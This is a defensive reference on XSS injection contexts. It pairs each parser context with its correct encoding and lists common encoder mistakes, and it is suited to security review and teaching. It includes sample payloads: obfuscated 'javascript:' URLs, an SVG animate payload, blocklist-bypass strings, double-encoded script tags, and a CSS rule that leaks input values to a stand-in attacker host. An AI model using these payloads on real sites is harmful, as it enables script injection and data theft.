# Injection Contexts and Correct Encoding

The single most useful question in XSS analysis: **what parser state is the
untrusted byte in?** Encoding is only correct relative to a context. This file
is the matrix.

## Contents

- [The context matrix](#the-context-matrix)
- [HTML text content](#html-text-content)
- [Quoted attribute values](#quoted-attribute-values)
- [Unquoted attribute values](#unquoted-attribute-values)
- [Event handler attributes](#event-handler-attributes)
- [JavaScript contexts](#javascript-contexts)
- [URL contexts](#url-contexts)
- [CSS contexts](#css-contexts)
- [SVG and MathML](#svg-and-mathml)
- [Special parsing states](#special-parsing-states)
- [Recurring encoder mistakes](#recurring-encoder-mistakes)
- [Double encoding and double decoding](#double-encoding-and-double-decoding)

---

## The context matrix

| Context | What breaks out | Correct defense |
|---|---|---|
| HTML text node | `<` `&` | HTML entity encoding |
| Quoted attribute | the matching quote, `&` | Attribute encoding + always quote |
| Unquoted attribute | space, tab, newline, `/`, `>`, backtick, `=` | Quote the attribute, then encode |
| Event handler attr | HTML-decode then JS-parse (two passes) | Never place untrusted data here |
| JS string literal | `'` `"` `\` `</script` `<!--` U+2028 U+2029 | JSON-serialize + escape `<` as `\u003c` |
| JS code position | everything | Never place untrusted data here |
| URL in `href`/`src` | `javascript:` `data:` `vbscript:` | Scheme allowlist after normalization |
| CSS value | `}` `;` `url(` `expression(` `@import` | Allowlist values; never interpolate raw |
| CSS `url()` | quote breakout, `javascript:` | Scheme allowlist + quote |
| HTML comment | `-->` `--!>` | Do not put untrusted data in comments |
| `<style>` / `<script>` / `<textarea>` / `<title>` | the closing tag string | Context-specific; see below |

Rule of thumb: an untrusted value should appear in **exactly one** context, and
that context should be known at development time. Anything that can land in
multiple contexts depending on data is a design flaw worth reporting on its own.

---

## HTML text content

```html
<p>Hello, USERDATA</p>
```

Encode `<`, `>`, `&`, and — defensively — `"` and `'`. Encoding `<` alone is
sufficient for pure text-node context, but encoding the full set survives later
refactoring that moves the value into an attribute.

This is the only context where "just HTML-escape it" is straightforwardly right,
which is why developers apply it everywhere and why so many bugs exist.

---

## Quoted attribute values

```html
<input value="USERDATA">
<div title='USERDATA'>
```

Encode the matching quote character and `&`. Note that **single-quoted
attributes need `'` encoded**, and a surprising number of encoders escape only
`"`. PHP's `htmlspecialchars()` without `ENT_QUOTES` is the classic case: it
escapes `"` but historically not `'`. Always pass `ENT_QUOTES | ENT_HTML5`.

Also verify the attribute is not one where a *value* is interpreted:
`href`, `src`, `action`, `formaction`, `data`, `srcdoc`, `style`, any `on*`.
Those have their own rules below — attribute encoding does not save them.

---

## Unquoted attribute values

```html
<input value=USERDATA>
```

Breakout needs no quote at all — a space, tab, newline, form feed, `/`, or
backtick ends the value and lets a new attribute start, e.g. `x onfocus=...`.
Backtick matters because some legacy parsers treat it as a quote.

The correct fix is not to encode more aggressively; it is to **quote the
attribute**. Report unquoted attributes as a finding even when the current
encoder happens to block spaces, because the escape is one refactor away from
failing.

Template engines that build attributes from dictionaries
(`{% for k,v in attrs %}{{k}}={{v}}{% endfor %}`) are a reliable source of this.

---

## Event handler attributes

```html
<button onclick="doThing('USERDATA')">
```

This is a **double-decoding context**: the HTML parser decodes entities first,
then the JS parser runs on the result. So `&#39;` becomes `'` before JS sees it —
HTML-encoding does not protect a JS string here, it just delays it one step.

The only reliable answer is to not place untrusted data in event handler
attributes at all. Use `addEventListener` and pass the data via a `data-*`
attribute (HTML-attribute-encoded) read with `dataset`, or via a closure.

If it must stay inline, the value needs JS escaping *and* HTML attribute
encoding applied in the correct order — treat any code doing this as suspect and
recommend restructuring.

---

## JavaScript contexts

### Inside a string literal in a `<script>` block

```html
<script>var name = "USERDATA";</script>
```

Dangerous characters: `"`, `'`, `\`, and — critically — `</script`, which
terminates the script element *regardless of JS string context*, because the
HTML tokenizer wins. Also `<!--` and `<script` can shift the parser into
odd states, and U+2028/U+2029 are line terminators in older JS engines.

Correct defense: serialize the value with `JSON.stringify`, then escape `<`, `>`,
`&`, U+2028 and U+2029 as `\u003c`, `\u003e`, `\u0026`, `\u2028`, `\u2029`.
Many frameworks ship a helper (`json_script` in Django, `to_json` +
`escape_javascript` in Rails, `@json` in Blade).

Better structural pattern — take the data out of the script context entirely:

```html
<script type="application/json" id="cfg">{"name": "USERDATA"}</script>
<script>const cfg = JSON.parse(document.getElementById('cfg').textContent);</script>
```

`<script type="application/json">` content is not executed and its text is not
HTML-parsed as markup, so a single HTML-escape of `<` on the JSON is sufficient.
Still escape `</script>` inside strings.

### Inside a code position

```html
<script>var x = USERDATA;</script>
<script>doThing(USERDATA);</script>
```

There is no encoding that makes arbitrary data safe here. Either constrain the
value to a strict type (integer parsed and re-serialized, boolean, enum member
validated against an allowlist) or move it to the JSON pattern above.

### Template literals

```js
const html = `<div>${userData}</div>`;
```

Backticks and `${` are the breakout characters when the *template itself* is
built from untrusted data. When only the interpolation is untrusted, the risk is
the resulting HTML string reaching an `innerHTML` sink — that is an HTML-context
problem, not a JS one.

---

## URL contexts

```html
<a href="USERDATA">
<img src="USERDATA">
<form action="USERDATA">
<iframe src="USERDATA">
```

Attribute encoding is irrelevant here — `javascript:alert(1)` contains no
special HTML characters. The defense is a **scheme allowlist after
normalization**:

```js
function safeUrl(raw) {
  let u;
  try { u = new URL(raw, document.baseURI); } catch { return '#'; }
  return ['http:', 'https:', 'mailto:'].includes(u.protocol) ? u.href : '#';
}
```

What defeats naive checks:

- Leading/embedded whitespace and control characters: `\tjavascript:`,
  ` javascript:`, `java\nscript:`, `\x00javascript:` — browsers strip these
  before scheme parsing
- Case: `JaVaScRiPt:`
- HTML entities, when the value passed through markup: `&#106;avascript:`
- URL-encoded colon: `javascript%3aalert(1)` (relevant when the value is
  decoded before use)
- `data:text/html;base64,...` — treat `data:` as blocked in `href`/`src`
- Protocol-relative `//attacker.example` for open redirect (not XSS, but usually
  the same code path and worth reporting together)

Relative-path-only requirements should be enforced positively (must start with
a single `/` and not `//` or `/\`), not by blocklisting schemes.

Also: `srcdoc` on an iframe is an **HTML** context, not a URL context —
its content is parsed as a full document, with entity decoding, so it needs
HTML-escaping of the whole document string.

---

## CSS contexts

```html
<div style="width: USERDATA">
<style>.cls { background: url(USERDATA); }</style>
```

Script execution from CSS is largely historical (`expression()` in old IE,
`-moz-binding`), but CSS injection is still a real finding:

- Data exfiltration via attribute selectors plus a network-fetching property:
  `input[value^="a"] { background: url(//attacker/a); }` leaks a value character
  by character
- `@import` pulling attacker CSS
- Overlay/defacement attacks enabling clickjacking-style deception
- `url(javascript:...)` in legacy engines

Do not interpolate untrusted data into CSS. Where a user must control styling,
allowlist properties and validate values against strict patterns (a colour hex,
a number plus unit), and never let a `url()` value come from input without a
scheme allowlist.

---

## SVG and MathML

SVG is HTML's most common sanitizer bypass surface because it is *foreign
content* with different parsing rules:

- `<svg><script>` executes
- `<svg><foreignObject>` re-enters HTML parsing
- `xlink:href` and `href` on `<a>` accept `javascript:` in older engines
- `<animate attributeName="href" values="javascript:alert(1)">` sets an attribute
  without ever containing the scheme in a static attribute position
- `<set>`, `<use>` with external references
- Event attributes on SVG elements: `onbegin`, `onend`, `onrepeat`, `onload`

Practical consequences worth reporting:

- **User-uploaded SVG served inline from the app origin is stored XSS.** Serve
  uploads from a separate sandbox origin, with `Content-Disposition: attachment`
  or a strict `Content-Security-Policy` on the response, and
  `X-Content-Type-Options: nosniff`. Rasterizing on upload also removes the
  issue.
- Sanitizer configs that add `svg`/`math` to the allowlist need scrutiny: it
  substantially widens the parser surface and is where several historic
  sanitizer bypasses lived.

---

## Special parsing states

Elements whose content model changes the rules:

| Element | Behaviour | Consequence |
|---|---|---|
| `<script>` | raw text; only `</script` ends it | Entity encoding does nothing |
| `<style>` | raw text; only `</style` ends it | Same |
| `<textarea>`, `<title>` | escapable raw text; entities decode | Escaping `<` suffices, but the closing tag string ends it |
| `<noscript>` | parsed differently depending on scripting-enabled flag | Classic mXSS surface |
| `<template>` | content parsed into a separate document fragment | Sanitizer/browser disagreement surface |
| `<iframe srcdoc>` | attribute value is a full HTML document | Needs double escaping |
| `<!-- -->` | ends at `-->` and (legacy) `--!>` | Never put input in comments |
| `<xmp>`, `<plaintext>`, `<listing>` | legacy raw-text elements | Rare but bypass sanitizers that do not model them |

**Mutation XSS** lives in the gaps between these states. If sanitized markup is
re-serialized and re-parsed, the second parse can produce different elements than
the sanitizer saw. Detection rule: find any place where sanitizer output is
modified, stored, wrapped, or round-tripped through `innerHTML` before display,
and flag it. Sanitize as the last step before insertion.

---

## Recurring encoder mistakes

A short list that catches a large share of real findings:

1. **HTML-encoding applied to a JS or URL context.** The most common single
   mistake. `&quot;` does nothing against `javascript:`.
2. **`htmlspecialchars()` without `ENT_QUOTES`** in PHP, combined with
   single-quoted attributes.
3. **`escape()` / `encodeURIComponent()` used as HTML escaping.** They are URL
   functions; they do not encode `<`.
4. **Escaping on input instead of output.** Breaks when the same data is later
   rendered into a different context, and misses data written by other paths.
5. **Blocklist filters** stripping `<script>` or `javascript:` — bypassable by
   case, nesting (`<scr<script>ipt>`), alternate tags, and event attributes.
   Report the approach itself as the defect.
6. **Escape-hatch in a "trusted" branch** — `|safe` applied because the value is
   "admin-controlled", where admin content is itself user-submitted or where a
   lower-privileged role can reach the field.
7. **Autoescaping disabled globally** in the template engine config; every
   template becomes a potential sink.
8. **Markdown renderers with raw HTML enabled.** `marked`, `markdown-it`,
   `showdown` etc. pass through HTML by default or on a flag. The renderer output
   must be sanitized, or raw HTML disabled.
9. **Escaping then decoding.** Server escapes, client calls
   `decodeURIComponent` or assigns through a sink that decodes entities.
10. **Encoding the value but not the attribute name** in dynamic attribute
    construction.

---

## Double encoding and double decoding

Where a value passes through more than one decode step — proxy, framework
middleware, application-level `decodeURIComponent`, then a sink that decodes
entities — an input like `%253Cscript%253E` can arrive as `<script>` after two
decodes.

When reviewing, count the decodes along the path and compare with the number of
encodes. Mismatch is the bug. The structural fix is to decode exactly once, as
early as possible, and to encode exactly once, as late as possible, at the point
where the context is known.
